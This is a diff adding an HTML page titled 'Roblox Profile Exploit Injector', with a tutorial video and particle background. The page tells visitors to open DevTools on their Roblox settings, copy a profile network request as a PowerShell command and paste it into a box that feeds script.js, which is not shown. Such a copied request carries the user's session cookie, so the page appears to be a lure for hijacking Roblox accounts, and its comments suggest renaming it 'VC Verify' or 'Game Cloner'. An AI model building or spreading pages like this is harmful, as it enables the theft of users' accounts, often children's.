@@ -1,0 +1,70 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit Loader</title>
+    <link rel="icon" href="logo.png" type="image/png">
+    <link rel="stylesheet" href="style.css">
+    <!-- Added Poppins font to match the rest of the site -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- The particle background container, essential for the look -->
+    <div id="particles-js"></div>
+
+    <!-- The menu bar now has the glass-effect class -->
+    <nav class="menu-bar glass-effect">
+        <img src="logo.png" alt="Roblox Logo" class="menu-logo">
+        <ul>
+            <!-- You can rename this link to be more specific if you like, e.g., "VC Verify" or "Game Cloner" -->
+            <li><a href="index.html">Go Back</a></li>
+            <li><a href="tut.html">Tutorial</a></li>
+            <li><a href="stu.html">Status</a></li>
+        </ul>
+    </nav>
+
+    <!-- The main container also gets the glass-effect class -->
+    <div class="container glass-effect">
+        <h1>Roblox Profile Exploit Injector</h1>
+        <p class="instructions">
+            Follow the video tutorial carefully. Go to your Roblox settings, open DevTools (F12), go to Network, refresh, find 'profile' (or a similar user request), right-click -> Copy -> Copy as PowerShell. Paste the entire command below.
+        </p>
+
+        <!-- This ID is untouched for JavaScript compatibility -->
+        <textarea id="powershellInput" placeholder="Paste the copied PowerShell command here..."></textarea>
+        
+        <!-- This ID is untouched for JavaScript compatibility -->
+        <button id="executeButton">Load</button>
+
+        <!-- This ID is untouched for JavaScript compatibility (Removed the duplicate) -->
+        <p id="statusMessage"></p>
+        
+        <div class="video-container">
+            <iframe
+                width="560"
+                height="315"
+                src="https://www.youtube.com/embed/nDvbBmSjl0M?si=mIM9iZ5V"
+                title="YouTube video player"
+                frameborder="0"
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                allowfullscreen>
+            </iframe>
+        </div>
+    </div>
+
+    <!-- No changes to the script tag, 'defer' is good practice -->
+    <script src="script.js" defer></script>
+    
+    <!-- This script is needed to run the particles on this page too -->
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <script>
+        particlesJS("particles-js", {
+          "particles": { "number": { "value": 80, "density": { "enable": true, "value_area": 800 } }, "color": { "value": "#00ff00" }, "shape": { "type": "circle" }, "opacity": { "value": 0.5, "random": true, "anim": { "enable": true, "speed": 0.4, "opacity_min": 0.1, "sync": false } }, "size": { "value": 3, "random": true }, "line_linked": { "enable": true, "distance": 150, "color": "#00ff00", "opacity": 0.2, "width": 1 }, "move": { "enable": true, "speed": 1, "direction": "none", "random": true, "straight": false, "out_mode": "out", "bounce": false } },
+          "interactivity": { "detect_on": "canvas", "events": { "onhover": { "enable": true, "mode": "grab" }, "onclick": { "enable": true, "mode": "push" }, "resize": true }, "modes": { "grab": { "distance": 140, "line_opacity": 0.4 }, "push": { "particles_nb": 3 } } },
+          "retina_detect": true
+        });
+    </script>
+</body>
+</html>
